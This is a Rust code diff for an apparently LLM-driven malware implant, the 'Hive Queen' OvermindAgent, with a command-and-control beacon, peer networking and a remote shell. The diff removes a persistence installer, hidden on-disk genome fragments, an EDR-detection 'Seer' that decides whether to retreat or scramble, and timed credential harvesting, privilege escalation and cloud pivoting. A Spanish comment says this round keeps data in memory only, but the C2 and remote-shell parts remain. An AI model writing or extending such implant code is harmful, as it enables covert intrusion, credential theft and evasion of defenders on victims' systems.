@@ -9,9 +9,6 @@ use uuid::Uuid;
 use hive_base::phoenix::AgentBlueprint;
 use hive_base::phoenix::Phoenix;
 
-use hive_base::seer::Seer;
-use hive_base::seer::{SeerAction, TelemetrySample};
-
 // smoke_signals only needed for OrgCloudProfile (OPSEC calibration)
 use hive_base::smoke_signals::learn_org_profile;
 
@@ -44,7 +41,6 @@ struct OvermindAgent {
     hivemind: hive_base::hivemind::HiveMind,
     whispernet: hive_base::whispernet::WhisperNet,
     last_tournament_gen: usize,
-    seer: Seer,
     interactive_shell: Option<hive_base::remote_shell::WsShell>,
 }
 
@@ -69,8 +65,6 @@ impl OvermindAgent {
                 encryption_enabled: true,
             });
 
-        let seer = Seer::new();
-
         let agent = Self {
             comms,
             identity,
@@ -82,7 +76,6 @@ impl OvermindAgent {
             hivemind: hive_base::hivemind::HiveMind::new(),
             whispernet,
             last_tournament_gen: 0,
-            seer,
             interactive_shell: None,
         };
 
@@ -334,23 +327,10 @@ impl OvermindAgent {
         self.last_tournament_gen += 1;
     }
 
-    async fn seeds_phoenix(&self) {
-        let loader_script = std::env::current_exe()
-            .map(|p| p.to_string_lossy().to_string())
-            .unwrap_or_else(|_| "/tmp/.hive_queen".to_string());
-        let base_path = std::path::Path::new("/tmp/.hive_persistence");
-        let mechs = Phoenix::install_persistence(&loader_script, base_path);
-        for m in &mechs {
-            info!("Phoenix: {} installed at {}", m.name, m.path);
-        }
-    }
-
     async fn run(&mut self) {
         info!("Hive Queen starting | ID: {}", self.identity.id());
         info!("Ollama: {} | Model: {}", self.ollama_url, self.model);
         self.send_heartbeat().await;
-
-        self.seeds_phoenix().await;
 
         let mut heartbeat_timer = time::interval(self.heartbeat_interval);
         let mut tournament_timer = time::interval(Duration::from_secs(600));
@@ -358,11 +338,7 @@ impl OvermindAgent {
         let mut whisper_timer = time::interval(Duration::from_secs(60));
 
         let mut phoenix_timer = time::interval(Duration::from_secs(300));
-        let mut seer_timer = time::interval(Duration::from_secs(120));
         let mut c2_beacon_timer = time::interval(Duration::from_secs(1800));
-        let mut leech_timer = time::interval(Duration::from_secs(1800));
-        let mut privesc_timer = time::interval(Duration::from_secs(300));
-        let mut cloud_pivot_timer = time::interval(Duration::from_secs(1800));
 
         loop {
             tokio::select! {
@@ -386,6 +362,8 @@ impl OvermindAgent {
                         self.whispernet.peers().len(), self.whispernet.messages().len());
                 }
                 _ = phoenix_timer.tick() => {
+                    // Ronda 6: snapshot del genoma SOLO en memoria (sin hide,
+                    // sin persistencia, sin escrituras).
                     let blueprint = AgentBlueprint {
                         role: "queen".into(),
                         binary_hash: format!("{}", self.identity.id()),
@@ -399,70 +377,12 @@ impl OvermindAgent {
                         encrypted_chunk: vec![],
                     };
                     let genome = Phoenix::generate_genome(vec![blueprint]);
-                    let mut fragments = Phoenix::fragment_genome(&genome, 4);
-                    for frag in &mut fragments {
-                        if let Ok(msg) = Phoenix::hide(frag, std::path::Path::new("/tmp/.hive_genome")) {
-                            info!("Phoenix: {}", msg);
-                        }
-                    }
-                }
-                _ = seer_timer.tick() => {
-                    let sample = TelemetrySample {
-                        edr_process_count: 0,
-                        total_processes: self.whispernet.peers().len() as u32 + 100,
-                        uptime_hours: 24,
-                        firewall_rules: 10,
-                        logged_in_users: 2,
-                        listening_ports: 5,
-                        has_defender: false,
-                        has_sentinelone: false,
-                        has_crowdstrike: false,
-                        has_carbonblack: false,
-                        has_symantec: false,
-                        is_vm: false,
-                        is_domain_controller: false,
-                        is_server_os: false,
-                    };
-                    self.seer.update_prediction(&sample, "colony_heartbeat");
-                    if let Some(pred) = self.seer.last_prediction() {
-                        info!("Seer: detection prob {:.2}, vector: {}, confidence {:.2}",
-                            pred.probability, pred.most_likely_vector, pred.confidence);
-                    }
-
-                    let action = self.seer.recommend_action();
-                    info!("Seer: recommended action {:?}", action);
-
-                    match action {
-                        SeerAction::Retreat => {
-                            let msg = Message::belief(
-                                self.identity.id(), Role::Queen,
-                                "SafetyTrigger".into(),
-                                hive_base::Value::Bool(true),
-                                1.0,
-                            );
-                            self.publish_msg(msg).await;
-                            info!("Seer: SafetyTrigger published — colony alerted");
-                        }
-                        SeerAction::Scramble => {
-                            if let Some(directive_id) = self.seer.steer(&mut self.hivemind, 0.5) {
-                                info!("Seer: scramble proposed directive {}", directive_id);
-                                let mut rep_map = HashMap::new();
-                                rep_map.insert(self.identity.id(), 1.0);
-                                self.hivemind.tally_votes(directive_id, &rep_map);
-                                for executed_id in self.hivemind.execute_approved() {
-                                    let Some(directive) = self.hivemind.directives.iter()
-                                        .find(|d| d.directive_id == executed_id) else {
-                                        warn!("Seer: directive {} no longer present, skipping", executed_id);
-                                        continue;
-                                    };
-                                    let msg = self.hivemind.to_belief(directive, self.identity.id());
-                                    self.publish_msg(msg).await;
-                                    info!("Seer: scramble directive {} executed", executed_id);
-                                }
-                            }
-                        }
-                        SeerAction::Proceed => {}
-                    }
+                    let fragments = Phoenix::fragment_genome(&genome, 4);
+                    info!(
+                        "Phoenix: genoma {} fragmentado en {} fragmentos (en memoria)",
+                        genome.genome_id,
+                        fragments.len()
+                    );
                 }
                 // ── C2 beacon via multi-channel failover director ─────────
                 _ = c2_beacon_timer.tick() => {
@@ -477,27 +397,6 @@ impl OvermindAgent {
                         info!("C2: colony heartbeat delivered via failover director");
                     } else {
                         warn!("C2: colony heartbeat failed on all channels");
-                    }
-                }
-                // ── Leech: automated credential harvesting ───────────────
-                _ = leech_timer.tick() => {
-                    info!("LEECH: queuing credential harvest cycle");
-                    self.comms.send_harvest().await;
-                }
-                // ── LPE: privilege escalation with adaptive interval ─────
-                _ = privesc_timer.tick() => {
-                    let (attempted, success) = self.comms.escalate_privileges().await;
-                    if attempted && success {
-                        info!("PRIVESC: root access achieved — adjusting operations");
-                    } else if attempted {
-                        info!("PRIVESC: no vector succeeded — waiting for next attempt");
-                    }
-                }
-                // ── Cloud Worker: pivot into cloud providers ─────────────
-                _ = cloud_pivot_timer.tick() => {
-                    let (executed, resources) = self.comms.pivot_cloud().await;
-                    if executed {
-                        info!("CLOUD: pivot executed — {} resources found", resources);
                     }
                 }
                 _ = time::sleep(Duration::from_millis(200)) => { self.process_incoming().await; }
